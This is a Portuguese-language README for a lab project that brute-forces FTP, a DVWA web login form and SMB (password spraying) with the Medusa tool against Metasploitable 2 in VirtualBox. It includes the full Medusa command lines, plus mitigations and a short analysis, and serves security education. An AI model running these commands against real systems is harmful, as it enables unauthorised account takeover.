# 🔐 Projeto: Simulação de Ataques de Força Bruta com Medusa (Kali Linux)

## 📌 Descrição

Este projeto tem como objetivo demonstrar, na prática, a exploração de vulnerabilidades por meio de ataques de força bruta utilizando a ferramenta **Medusa**, em um ambiente controlado com máquinas virtuais.

Foram utilizados os ambientes vulneráveis **Metasploitable 2** e **DVWA (Damn Vulnerable Web Application)** para simular cenários reais de ataque e testar estratégias de mitigação.

---

## 🛠️ Ambiente

* Kali Linux (máquina atacante)
* Metasploitable 2 (máquina vulnerável)
* DVWA (aplicação web vulnerável)
* VirtualBox com rede Host-Only

---

## ⚙️ Ferramentas utilizadas

* Medusa (ataques de brute-force)
* Wordlists do Kali Linux como base (ex: `piata_ssh_userpass.txt`)
* Serviços explorados:

  * FTP
  * HTTP (formulários web - DVWA)
  * SMB

---

## 🚨 Ataques simulados

### 🔓 1. Ataque de força bruta em FTP

**Comando utilizado:**

```bash
medusa -h <IP_ALVO> -U wordlists/customwordlist.txt -P wordlists/customwordlist.txt -M ftp -t 6 -f
```

**Resultado:**

* Credenciais encontradas com sucesso
* Acesso ao servidor FTP obtido

---

### 🌐 2. Ataque em formulário web (DVWA)

**Objetivo:**
Automatizar tentativas de login via HTTP POST.

**Comando exemplo:**

```bash
medusa -h <IP_ALVO> -u wordlists/fasttrack.txt -P wordlists/fasttrack.txt -M web-form -m FORM:"/dvwa/login.php" -m FORM-DATA:"post?username=^USER^&password=^PASS^"
```

---

### 🖥️ 3. Password spraying em SMB

**Enumeração de usuários + tentativa de senha comum**

```bash
medusa -h <IP_ALVO> -U wordlists/fasttrack.txt -P wordlists/fasttrack.txt -M smbnt
```

---

## 📊 Resultados

* Identificação de credenciais fracas
* Validação de acessos indevidos
* Demonstração prática da vulnerabilidade de serviços expostos

---

## 🛡️ Medidas de mitigação

* Implementar políticas de senha forte
* Limitar tentativas de login (lockout)
* Uso de autenticação multifator (MFA)
* Monitoramento de logs
* Desativar serviços desnecessários

---

## 💡 Análise crítica

Os ataques realizados foram bem-sucedidos principalmente devido ao uso de credenciais fracas e previsíveis presentes no ambiente vulnerável.

O uso de wordlists simples, como a `fasttrack.txt`, demonstra que mesmo ataques básicos podem comprometer sistemas mal configurados.

Além disso, o password spraying evidenciou como senhas comuns reutilizadas entre múltiplos usuários representam um risco significativo.

A ausência de mecanismos de bloqueio após múltiplas tentativas de login também contribuiu diretamente para o sucesso dos ataques.

---

## 📄 Estrutura do repositório

```
medusa-bruteforce-lab/
│
├── README.md
├── wordlists/
│   └── fasttrack.txt
├── screenshots/
│   ├── ftp_attack.png
└── └── smb_attack.png
```

---

## ⚠️ Aviso

Este projeto foi desenvolvido exclusivamente para fins educacionais em ambiente controlado.
